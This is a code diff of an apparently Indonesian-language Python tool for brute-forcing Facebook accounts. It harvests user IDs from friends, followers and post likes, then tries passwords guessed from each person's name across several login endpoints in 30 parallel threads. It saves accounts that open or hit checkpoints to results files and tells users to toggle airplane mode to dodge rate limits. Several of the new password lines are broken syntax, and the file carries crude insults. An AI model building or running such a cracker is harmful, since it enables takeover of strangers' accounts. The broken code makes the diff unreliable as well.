@@ -88,7 +88,7 @@ def tod():
 logo =  ''' \033[0;96m  __  ___     ____  _   ___  ____
 \033[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/\033[0;97m|| Created By \033[0;93mAang-XD
 \033[0;96m / /|_/ / // / / __/ / / _  / _/  \033[0;97m|| Youtube \033[0;93mAang-XD
-\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;93mv3.1\033[0;97m|| Facebook \033[0;93mMyAangXD'''
+\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;93mv3.2\033[0;97m|| Facebook \033[0;93mMyAangXD'''
 
 lo_ngentod = '1714009362122228'
 #Crack selesai sayang hehe
@@ -156,20 +156,20 @@ def moch_yayan():
     print '%s╠══[%s Github  : \033[0;93mGithub.com/AngCyber'%(O,N);time.sleep(0.04)
     print '%s╠══[%s Team    : \033[0;93mXNX-CODE TEAM'%(O,N); time.sleep(0.04)
     print '%s╠════════════════════════════════════════════════════════%s'%(O,N)
-    print '%s╠══[1]%s \033[0;93mDump id \033[0;97mdari teman \033[0;96m[5000 ID]'%(O,N);time.sleep(0.04)
-    print '\033[0;97m%s╠══[2]%s \033[0;93mDump id \033[0;97mdari teman publik \033[0;96m[5000 ID]'%(O,N);time.sleep(0.04)
-    print '\033[0;97m%s╠══[3]%s \033[0;93mDump id \033[0;97mdari total followers \033[0;96m[5000 ID]'%(O,N);time.sleep(0.04)
-    print '\033[0;97m%s╠══[4]%s \033[0;93mDump id \033[0;97mdari like postingan \033[0;96m[5000 ID]'%(O,N);time.sleep(0.04)
-    print '\033[0;97m%s╠══[5]%s Start \033[0;93mCracking'%(O,N);time.sleep(0.04)
+    print '%s╠══[1]%s \033[0;93mDump id \033[0;97mdari teman \033[0;96m[ \033[0;93m5000 \033[0;96m]'%(O,N);time.sleep(0.04)
+    print '\033[0;97m%s╠══[2]%s \033[0;93mDump id \033[0;97mdari teman publik \033[0;96m[ \033[0;93m5000 \033[0;96m]'%(O,N);time.sleep(0.04)
+    print '\033[0;97m%s╠══[3]%s \033[0;93mDump id \033[0;97mdari total followers \033[0;96m[ \033[0;93m5000 \033[0;96m]'%(O,N);time.sleep(0.04)
+    print '\033[0;97m%s╠══[4]%s \033[0;93mDump id \033[0;97mdari like postingan \033[0;96m[ \033[0;93m5000 \033[0;96m]'%(O,N);time.sleep(0.04)
+    print '\033[0;97m%s╠══[5]%s Mulai \033[0;93mCrack Facebook'%(O,N);time.sleep(0.04)
     print '%s╠══[6]%s Cek informasi \033[0;93makun facebook'%(O,N);time.sleep(0.04)
     print '%s╠══[7]%s Lihat hasil \033[0;93mcrack \033[0;97msaya'%(O,N);time.sleep(0.04)
     print '%s╠══[8]%s Setting \033[0;93muser agent'%(O,N);time.sleep(0.04)
     print '%s╠══[9]%s Informasi %sScript Multi BF%s'%(O,N,O,N);time.sleep(0.04)
-    print '%s╠══[0]%s Keluar \033[0;96m[%sAhh Ngecrot%s\033[0;96m]'%(O,N,K,N);time.sleep(0.04)
+    print '%s╠══[0]%s Keluar \033[0;96m[ %sAhh Ngecrot%s\033[0;96m ]'%(O,N,K,N);time.sleep(0.04)
     print '%s║%s'%(O,N);time.sleep(0.04)
     pepek = raw_input('\033[0;96m╚══[•] \033[0;97mMenu : ')
     if pepek == '':
-        print '%s%s╚══[%s JANGAN KOSONG KENTOD ]'%(N,M,N);time.sleep(0.09);moch_yayan()
+        print '%s%s╚══[%s JANGAN KOSONG KENTOD ]'%(N,M,N);time.sleep(2);moch_yayan()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -515,9 +515,9 @@ def cek_ingfo(kontol):
         month = '%s-%s'%(M,N)
         day = '%s-%s'%(M,N)
     except:pass
-    print '[•] terakhir di update pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
+    print '[•] Terakhir di update pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
     print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
-    jalan('\n[%s✓%s] berhasil mengecek data-data akun facebook\n\n'%(O,N));exit()
+    jalan('\n[%s✓%s] Berhasil mengecek data-data akun facebook\n\n'%(H,N));exit()
 
 # cek informasi script
 def info_tools():
@@ -625,9 +625,9 @@ class __crack__:
                             print '%s[%s×%s] jangan kosong kentod'%(N,M,N);self.__yan__()
                             print '%s║%s '%(O,N)
                         elif cin == '1':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -639,9 +639,9 @@ class __crack__:
                             hasil(ok,cp)
                             print '%s║%s '%(O,N)
                         elif cin == '2':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -653,9 +653,9 @@ class __crack__:
                             hasil(ok,cp)
                             print '%s║%s '%(O,N)
                         elif cin == '3':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -667,9 +667,9 @@ class __crack__:
                             hasil(ok,cp)
                             print '%s║%s '%(O,N)
                         elif cin == '4':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -681,30 +681,16 @@ class __crack__:
                             hasil(ok,cp)
                             print '%s║%s '%(O,N)
                         elif cin == '4':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
                                         __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                     except: pass
-             
-                            os.remove(self.apk)
-                            hasil(ok,cp)
-                            print '%s║%s '%(O,N)
-                        elif cin == '6':
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
-                                for ikeh in self.id:
-                                    try:
-                                        kimochi = ikeh.split('<=>')[0]
-                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
-                                    except: pass  
-
+            
                             os.remove(self.apk)
                             hasil(ok,cp)
                         else:
@@ -716,7 +702,7 @@ class __crack__:
                     print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[ \033[0;93mUa Xiaomi \033[0;96m]'%(O,N)
                     print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[ \033[0;93mUa Vivo \033[0;96m]'%(O,N)
                     print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[ \033[0;93mUa Asus \033[0;96m]'%(O,N)
-                    print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
+                    print '%s╠══[5]%s Metode \033[0;93mMobile \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
                     print '%s║%s '%(O,N)
                     __yan__(pwek.split(','))
                     break  
@@ -727,7 +713,7 @@ class __crack__:
             print '%s╠══[2]%s Metode \033[0;93mB-Api \033[0;97mV2 \033[0;96m[ \033[0;93mUa Xiaomi \033[0;96m]'%(O,N)
             print '%s╠══[3]%s Metode \033[0;93mMbasic \033[0;97mV1 \033[0;96m[ \033[0;93mUa Vivo \033[0;96m]'%(O,N)
             print '%s╠══[4]%s Metode \033[0;93mMbasic \033[0;97mV2 \033[0;96m[ \033[0;93mUa Asus \033[0;96m]'%(O,N)
-            print '%s╠══[5]%s Metode \033[0;93mMobile Fb \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
+            print '%s╠══[5]%s Metode \033[0;93mMobile \033[0;96m[ \033[0;93mUa Windows \033[0;96m]'%(O,N)
             print '%s║%s '%(O,N)
             self.__pler__()
         else:
@@ -996,18 +982,18 @@ class __crack__:
             print '%s[%s×%s] jangan kosong kentod'%(N,M,N);self.__pler__()
             print '%s║%s '%(O,N)
         elif yan in ('1', '01'):
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
@@ -1016,18 +1002,18 @@ class __crack__:
             hasil(ok,cp)
             print '%s║%s '%(O,N)
         elif yan in ('2', '02'):
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -1036,18 +1022,18 @@ class __crack__:
             hasil(ok,cp)
             print '%s║%s '%(O,N)
         elif yan in ('3', '03'):
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1056,18 +1042,18 @@ class __crack__:
             hasil(ok,cp)
             print '%s║%s '%(O,N)
         elif yan in ('4', '04'):
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1076,18 +1062,18 @@ class __crack__:
             hasil(ok,cp)
             print '%s║%s '%(O,N)
         elif yan in ('5', '05'):
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat 5 detik setelah dimulai\n'%(M,N)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n'%(H,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
